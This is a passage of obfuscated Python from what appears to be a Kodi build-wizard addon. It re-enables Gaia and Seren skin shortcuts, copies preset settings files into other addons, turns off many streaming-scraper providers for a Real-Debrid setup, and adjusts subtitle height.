    with open (OO0O00O0OOO0OOO00 ,'w')as OOOOO0000O0OOO0OO :#line:1187
      OOOOO0000O0OOO0OO .write (O0OO0OO00000O00OO )#line:1188
    OO0O00O0OOO0OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1192
    with open (OO0O00O0OOO0OOO00 ,'r')as OOOOO0000O0OOO0OO :#line:1193
      O0OO0OO00000O00OO =OOOOO0000O0OOO0OO .read ()#line:1194
    O0OO0OO00000O00OO =O0OO0OO00000O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1212
    with open (OO0O00O0OOO0OOO00 ,'w')as OOOOO0000O0OOO0OO :#line:1215
      OOOOO0000O0OOO0OO .write (O0OO0OO00000O00OO )#line:1216
    OO0O00O0OOO0OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1220
    with open (OO0O00O0OOO0OOO00 ,'r')as OOOOO0000O0OOO0OO :#line:1221
      O0OO0OO00000O00OO =OOOOO0000O0OOO0OO .read ()#line:1222
    O0OO0OO00000O00OO =O0OO0OO00000O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1240
    with open (OO0O00O0OOO0OOO00 ,'w')as OOOOO0000O0OOO0OO :#line:1243
      OOOOO0000O0OOO0OO .write (O0OO0OO00000O00OO )#line:1244
    OO0O00O0OOO0OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1248
    with open (OO0O00O0OOO0OOO00 ,'r')as OOOOO0000O0OOO0OO :#line:1249
      O0OO0OO00000O00OO =OOOOO0000O0OOO0OO .read ()#line:1250
    O0OO0OO00000O00OO =O0OO0OO00000O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1268
    with open (OO0O00O0OOO0OOO00 ,'w')as OOOOO0000O0OOO0OO :#line:1271
      OOOOO0000O0OOO0OO .write (O0OO0OO00000O00OO )#line:1272
    OO0O00O0OOO0OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1275
    with open (OO0O00O0OOO0OOO00 ,'r')as OOOOO0000O0OOO0OO :#line:1276
      O0OO0OO00000O00OO =OOOOO0000O0OOO0OO .read ()#line:1277
    O0OO0OO00000O00OO =O0OO0OO00000O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1295
    with open (OO0O00O0OOO0OOO00 ,'w')as OOOOO0000O0OOO0OO :#line:1298
      OOOOO0000O0OOO0OO .write (O0OO0OO00000O00OO )#line:1299
    OO0O00O0OOO0OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1301
    with open (OO0O00O0OOO0OOO00 ,'r')as OOOOO0000O0OOO0OO :#line:1302
      O0OO0OO00000O00OO =OOOOO0000O0OOO0OO .read ()#line:1303
    O0OO0OO00000O00OO =O0OO0OO00000O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1321
    with open (OO0O00O0OOO0OOO00 ,'w')as OOOOO0000O0OOO0OO :#line:1324
      OOOOO0000O0OOO0OO .write (O0OO0OO00000O00OO )#line:1325
    OO0O00O0OOO0OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1327
    with open (OO0O00O0OOO0OOO00 ,'r')as OOOOO0000O0OOO0OO :#line:1328
      O0OO0OO00000O00OO =OOOOO0000O0OOO0OO .read ()#line:1329
    O0OO0OO00000O00OO =O0OO0OO00000O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1347
    with open (OO0O00O0OOO0OOO00 ,'w')as OOOOO0000O0OOO0OO :#line:1350
      OOOOO0000O0OOO0OO .write (O0OO0OO00000O00OO )#line:1351
    OO0O00O0OOO0OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1354
    with open (OO0O00O0OOO0OOO00 ,'r')as OOOOO0000O0OOO0OO :#line:1355
      O0OO0OO00000O00OO =OOOOO0000O0OOO0OO .read ()#line:1356
    O0OO0OO00000O00OO =O0OO0OO00000O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1374
    with open (OO0O00O0OOO0OOO00 ,'w')as OOOOO0000O0OOO0OO :#line:1377
      OOOOO0000O0OOO0OO .write (O0OO0OO00000O00OO )#line:1378
def rdbuildinstallON ():#line:1381
    try :#line:1383
       O0OOO00OO00000O00 =ADDONPATH +"/resources/rd/victory.xml"#line:1384
       OO0000OOO000O00OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1385
       copyfile (O0OOO00OO00000O00 ,OO0000OOO000O00OO )#line:1387
       O0OOO00OO00000O00 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1389
       OO0000OOO000O00OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1390
       copyfile (O0OOO00OO00000O00 ,OO0000OOO000O00OO )#line:1392
       O0OOO00OO00000O00 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1394
       OO0000OOO000O00OO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1395
       copyfile (O0OOO00OO00000O00 ,OO0000OOO000O00OO )#line:1397
       O0OOO00OO00000O00 =ADDONPATH +"/resources/rd/Splash.png"#line:1400
       OO0000OOO000O00OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1401
       copyfile (O0OOO00OO00000O00 ,OO0000OOO000O00OO )#line:1403
    except :#line:1405
       pass #line:1406
def rdbuild ():#line:1416
	OO0O000O0O0O0O00O =(ADDON .getSetting ("auto_rd"))#line:1417
	if OO0O000O0O0O0O00O =='true':#line:1418
		O0OOOO0OOO0OO0OO0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1419
		O0OOOO0OOO0OO0OO0 .setSetting ('all_t','0')#line:1420
		O0OOOO0OOO0OO0OO0 .setSetting ('rd_menu_enable','false')#line:1421
		O0OOOO0OOO0OO0OO0 .setSetting ('magnet_bay','false')#line:1422
		O0OOOO0OOO0OO0OO0 .setSetting ('magnet_extra','false')#line:1423
		O0OOOO0OOO0OO0OO0 .setSetting ('rd_only','false')#line:1424
		O0OOOO0OOO0OO0OO0 .setSetting ('ftp','false')#line:1426
		O0OOOO0OOO0OO0OO0 .setSetting ('fp','false')#line:1427
		O0OOOO0OOO0OO0OO0 .setSetting ('filter_fp','false')#line:1428
		O0OOOO0OOO0OO0OO0 .setSetting ('fp_size_en','false')#line:1429
		O0OOOO0OOO0OO0OO0 .setSetting ('afdah','false')#line:1430
		O0OOOO0OOO0OO0OO0 .setSetting ('ap2s','false')#line:1431
		O0OOOO0OOO0OO0OO0 .setSetting ('cin','false')#line:1432
		O0OOOO0OOO0OO0OO0 .setSetting ('clv','false')#line:1433
		O0OOOO0OOO0OO0OO0 .setSetting ('cmv','false')#line:1434
		O0OOOO0OOO0OO0OO0 .setSetting ('dl20','false')#line:1435
		O0OOOO0OOO0OO0OO0 .setSetting ('esc','false')#line:1436
		O0OOOO0OOO0OO0OO0 .setSetting ('extra','false')#line:1437
		O0OOOO0OOO0OO0OO0 .setSetting ('film','false')#line:1438
		O0OOOO0OOO0OO0OO0 .setSetting ('fre','false')#line:1439
		O0OOOO0OOO0OO0OO0 .setSetting ('fxy','false')#line:1440
		O0OOOO0OOO0OO0OO0 .setSetting ('genv','false')#line:1441
		O0OOOO0OOO0OO0OO0 .setSetting ('getgo','false')#line:1442
		O0OOOO0OOO0OO0OO0 .setSetting ('gold','false')#line:1443
		O0OOOO0OOO0OO0OO0 .setSetting ('gona','false')#line:1444
		O0OOOO0OOO0OO0OO0 .setSetting ('hdmm','false')#line:1445
		O0OOOO0OOO0OO0OO0 .setSetting ('hdt','false')#line:1446
		O0OOOO0OOO0OO0OO0 .setSetting ('icy','false')#line:1447
		O0OOOO0OOO0OO0OO0 .setSetting ('ind','false')#line:1448
		O0OOOO0OOO0OO0OO0 .setSetting ('iwi','false')#line:1449
		O0OOOO0OOO0OO0OO0 .setSetting ('jen_free','false')#line:1450
		O0OOOO0OOO0OO0OO0 .setSetting ('kiss','false')#line:1451
		O0OOOO0OOO0OO0OO0 .setSetting ('lavin','false')#line:1452
		O0OOOO0OOO0OO0OO0 .setSetting ('los','false')#line:1453
		O0OOOO0OOO0OO0OO0 .setSetting ('m4u','false')#line:1454
		O0OOOO0OOO0OO0OO0 .setSetting ('mesh','false')#line:1455
		O0OOOO0OOO0OO0OO0 .setSetting ('mf','false')#line:1456
		O0OOOO0OOO0OO0OO0 .setSetting ('mkvc','false')#line:1457
		O0OOOO0OOO0OO0OO0 .setSetting ('mjy','false')#line:1458
		O0OOOO0OOO0OO0OO0 .setSetting ('hdonline','false')#line:1459
		O0OOOO0OOO0OO0OO0 .setSetting ('moviex','false')#line:1460
		O0OOOO0OOO0OO0OO0 .setSetting ('mpr','false')#line:1461
		O0OOOO0OOO0OO0OO0 .setSetting ('mvg','false')#line:1462
		O0OOOO0OOO0OO0OO0 .setSetting ('mvl','false')#line:1463
		O0OOOO0OOO0OO0OO0 .setSetting ('mvs','false')#line:1464
		O0OOOO0OOO0OO0OO0 .setSetting ('myeg','false')#line:1465
		O0OOOO0OOO0OO0OO0 .setSetting ('ninja','false')#line:1466
		O0OOOO0OOO0OO0OO0 .setSetting ('odb','false')#line:1467
		O0OOOO0OOO0OO0OO0 .setSetting ('ophd','false')#line:1468
		O0OOOO0OOO0OO0OO0 .setSetting ('pks','false')#line:1469
		O0OOOO0OOO0OO0OO0 .setSetting ('prf','false')#line:1470
		O0OOOO0OOO0OO0OO0 .setSetting ('put18','false')#line:1471
		O0OOOO0OOO0OO0OO0 .setSetting ('req','false')#line:1472
		O0OOOO0OOO0OO0OO0 .setSetting ('rftv','false')#line:1473
		O0OOOO0OOO0OO0OO0 .setSetting ('rltv','false')#line:1474
		O0OOOO0OOO0OO0OO0 .setSetting ('sc','false')#line:1475
		O0OOOO0OOO0OO0OO0 .setSetting ('seehd','false')#line:1476
		O0OOOO0OOO0OO0OO0 .setSetting ('showbox','false')#line:1477
		O0OOOO0OOO0OO0OO0 .setSetting ('shuid','false')#line:1478
		O0OOOO0OOO0OO0OO0 .setSetting ('sil_gh','false')#line:1479
		O0OOOO0OOO0OO0OO0 .setSetting ('spv','false')#line:1480
		O0OOOO0OOO0OO0OO0 .setSetting ('subs','false')#line:1481
		O0OOOO0OOO0OO0OO0 .setSetting ('tvs','false')#line:1482
		O0OOOO0OOO0OO0OO0 .setSetting ('tw','false')#line:1483
		O0OOOO0OOO0OO0OO0 .setSetting ('upto','false')#line:1484
		O0OOOO0OOO0OO0OO0 .setSetting ('vel','false')#line:1485
		O0OOOO0OOO0OO0OO0 .setSetting ('vex','false')#line:1486
		O0OOOO0OOO0OO0OO0 .setSetting ('vidc','false')#line:1487
		O0OOOO0OOO0OO0OO0 .setSetting ('w4hd','false')#line:1488
		O0OOOO0OOO0OO0OO0 .setSetting ('wav','false')#line:1489
		O0OOOO0OOO0OO0OO0 .setSetting ('wf','false')#line:1490
		O0OOOO0OOO0OO0OO0 .setSetting ('wse','false')#line:1491
		O0OOOO0OOO0OO0OO0 .setSetting ('wss','false')#line:1492
		O0OOOO0OOO0OO0OO0 .setSetting ('wsse','false')#line:1493
		O0OOOO0OOO0OO0OO0 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1494
		O0OOOO0OOO0OO0OO0 .setSetting ('debrid.only','true')#line:1495
		O0OOOO0OOO0OO0OO0 .setSetting ('hosts.captcha','false')#line:1496
		O0OOOO0OOO0OO0OO0 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1497
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.123moviehd','false')#line:1498
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.300mbdownload','false')#line:1499
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.alltube','false')#line:1500
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.allucde','false')#line:1501
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.animebase','false')#line:1502
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.animeloads','false')#line:1503
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.animetoon','false')#line:1504
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.bnwmovies','false')#line:1505
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.boxfilm','false')#line:1506
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.bs','false')#line:1507
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.cartoonhd','false')#line:1508
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.cdahd','false')#line:1509
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.cdax','false')#line:1510
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.cine','false')#line:1511
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.cinenator','false')#line:1512
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.cmovieshdbz','false')#line:1513
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.coolmoviezone','false')#line:1514
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.ddl','false')#line:1515
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.deepmovie','false')#line:1516
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.ekinomaniak','false')#line:1517
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.ekinotv','false')#line:1518
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.filiser','false')#line:1519
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.filmpalast','false')#line:1520
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.filmwebbooster','false')#line:1521
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.filmxy','false')#line:1522
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.fmovies','false')#line:1523
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.foxx','false')#line:1524
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.freefmovies','false')#line:1525
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.freeputlocker','false')#line:1526
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.furk','false')#line:1527
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.gamatotv','false')#line:1528
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.gogoanime','false')#line:1529
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.gowatchseries','false')#line:1530
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.hackimdb','false')#line:1531
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.hdfilme','false')#line:1532
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.hdmto','false')#line:1533
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.hdpopcorns','false')#line:1534
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.hdstreams','false')#line:1535
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.horrorkino','false')#line:1537
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.iitv','false')#line:1538
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.iload','false')#line:1539
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.iwaatch','false')#line:1540
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.kinodogs','false')#line:1541
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.kinoking','false')#line:1542
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.kinow','false')#line:1543
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.kinox','false')#line:1544
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.lichtspielhaus','false')#line:1545
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.liomenoi','false')#line:1546
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.magnetdl','false')#line:1549
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.megapelistv','false')#line:1550
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.movie2k-ac','false')#line:1551
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.movie2k-ag','false')#line:1552
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.movie2z','false')#line:1553
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.movie4k','false')#line:1554
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.movie4kis','false')#line:1555
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.movieneo','false')#line:1556
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.moviesever','false')#line:1557
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.movietown','false')#line:1558
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.mvrls','false')#line:1560
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.netzkino','false')#line:1561
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.odb','false')#line:1562
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.openkatalog','false')#line:1563
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.ororo','false')#line:1564
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.paczamy','false')#line:1565
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.peliculasdk','false')#line:1566
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.pelisplustv','false')#line:1567
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.pepecine','false')#line:1568
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.primewire','false')#line:1569
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.projectfreetv','false')#line:1570
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.proxer','false')#line:1571
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.pureanime','false')#line:1572
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.putlocker','false')#line:1573
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.putlockerfree','false')#line:1574
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.reddit','false')#line:1575
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.cartoonwire','false')#line:1576
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.seehd','false')#line:1577
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.segos','false')#line:1578
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.serienstream','false')#line:1579
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.series9','false')#line:1580
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.seriesever','false')#line:1581
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.seriesonline','false')#line:1582
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.seriespapaya','false')#line:1583
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.sezonlukdizi','false')#line:1584
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.solarmovie','false')#line:1585
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.solarmoviez','false')#line:1586
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.stream-to','false')#line:1587
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.streamdream','false')#line:1588
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.streamflix','false')#line:1589
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.streamit','false')#line:1590
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.swatchseries','false')#line:1591
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.szukajkatv','false')#line:1592
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.tainiesonline','false')#line:1593
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.tainiomania','false')#line:1594
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.tata','false')#line:1597
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.trt','false')#line:1598
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.tvbox','false')#line:1599
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.ultrahd','false')#line:1600
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.video4k','false')#line:1601
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.vidics','false')#line:1602
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.view4u','false')#line:1603
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.watchseries','false')#line:1604
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.xrysoi','false')#line:1605
		O0OOOO0OOO0OO0OO0 .setSetting ('provider.library','false')#line:1606
def fixfont ():#line:1609
	OOOOOOO0OOO00OO00 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1610
	O0O0O00OO0OO0O0O0 =json .loads (OOOOOOO0OOO00OO00 );#line:1612
	O0O0O0000000OO00O =O0O0O00OO0OO0O0O0 ["result"]["settings"]#line:1613
	O00O0OO0O00O00OO0 =[OO0OO00000O0O00O0 for OO0OO00000O0O00O0 in O0O0O0000000OO00O if OO0OO00000O0O00O0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1615
	OO0OO0O0000OOOOO0 =O00O0OO0O00O00OO0 ["options"];#line:1616
	O0O0O00OOOOO0O00O =O00O0OO0O00O00OO0 ["value"];#line:1617
	OO00O0O00OOO0OOOO =[OOO0O0O0O00O0O0OO for (OOO0O0O0O00O0O0OO ,OOO0O00O0OOO0O0OO )in enumerate (OO0OO0O0000OOOOO0 )if OOO0O00O0OOO0O0OO ["value"]==O0O0O00OOOOO0O00O ][0 ];#line:1619
	O000000OO00OO0O0O =(OO00O0O00OOO0OOOO +1 )%len (OO0OO0O0000OOOOO0 )#line:1621
	OOOOOOO00OOO0OO00 =OO0OO0O0000OOOOO0 [O000000OO00OO0O0O ]["value"]#line:1623
	OOO000OOOO00O0O0O =OO0OO0O0000OOOOO0 [O000000OO00OO0O0O ]["label"]#line:1624
	O0O00OO000OO00OO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1626
	try :#line:1628
		O0OOOO00000OOOOO0 =json .loads (O0O00OO000OO00OO0 );#line:1629
		if O0OOOO00000OOOOO0 ["result"]!=True :#line:1631
			raise Exception #line:1632
	except :#line:1633
		sys .stderr .write ("Error switching audio output device")#line:1634
		raise Exception #line:1635
def parseDOM2 (O0O000OO00O0O0O00 ,name =u"",attrs ={},ret =False ):#line:1636
	if isinstance (O0O000OO00O0O0O00 ,str ):#line:1639
		try :#line:1640
			O0O000OO00O0O0O00 =[O0O000OO00O0O0O00 .decode ("utf-8")]#line:1641
		except :#line:1642
			O0O000OO00O0O0O00 =[O0O000OO00O0O0O00 ]#line:1643
	elif isinstance (O0O000OO00O0O0O00 ,unicode ):#line:1644
		O0O000OO00O0O0O00 =[O0O000OO00O0O0O00 ]#line:1645
	elif not isinstance (O0O000OO00O0O0O00 ,list ):#line:1646
		return u""#line:1647
	if not name .strip ():#line:1649
		return u""#line:1650
	OOOO0O00OOOOOO0O0 =[]#line:1652
	for OOO00OOOOO0O00O00 in O0O000OO00O0O0O00 :#line:1653
		OO0OOOO0000O000O0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OOO00OOOOO0O00O00 )#line:1654
		for OO0O0O00000O0O00O in OO0OOOO0000O000O0 :#line:1655
			OOO00OOOOO0O00O00 =OOO00OOOOO0O00O00 .replace (OO0O0O00000O0O00O ,OO0O0O00000O0O00O .replace ("\n"," "))#line:1656
		O0OO0O0OO0OO00000 =[]#line:1658
		for OOOOO0OO0O00OOO00 in attrs :#line:1659
			OOO0OOO0OOO0OO0O0 =re .compile ('(<'+name +'[^>]*?(?:'+OOOOO0OO0O00OOO00 +'=[\'"]'+attrs [OOOOO0OO0O00OOO00 ]+'[\'"].*?>))',re .M |re .S ).findall (OOO00OOOOO0O00O00 )#line:1660
			if len (OOO0OOO0OOO0OO0O0 )==0 and attrs [OOOOO0OO0O00OOO00 ].find (" ")==-1 :#line:1661
				OOO0OOO0OOO0OO0O0 =re .compile ('(<'+name +'[^>]*?(?:'+OOOOO0OO0O00OOO00 +'='+attrs [OOOOO0OO0O00OOO00 ]+'.*?>))',re .M |re .S ).findall (OOO00OOOOO0O00O00 )#line:1662
			if len (O0OO0O0OO0OO00000 )==0 :#line:1664
				O0OO0O0OO0OO00000 =OOO0OOO0OOO0OO0O0 #line:1665
				OOO0OOO0OOO0OO0O0 =[]#line:1666
			else :#line:1667
				O00O000OOO00OO0O0 =range (len (O0OO0O0OO0OO00000 ))#line:1668
				O00O000OOO00OO0O0 .reverse ()#line:1669
				for OO0O000O00O0O0O0O in O00O000OOO00OO0O0 :#line:1670
					if not O0OO0O0OO0OO00000 [OO0O000O00O0O0O0O ]in OOO0OOO0OOO0OO0O0 :#line:1671
						del (O0OO0O0OO0OO00000 [OO0O000O00O0O0O0O ])#line:1672
		if len (O0OO0O0OO0OO00000 )==0 and attrs =={}:#line:1674
			O0OO0O0OO0OO00000 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OOO00OOOOO0O00O00 )#line:1675
			if len (O0OO0O0OO0OO00000 )==0 :#line:1676
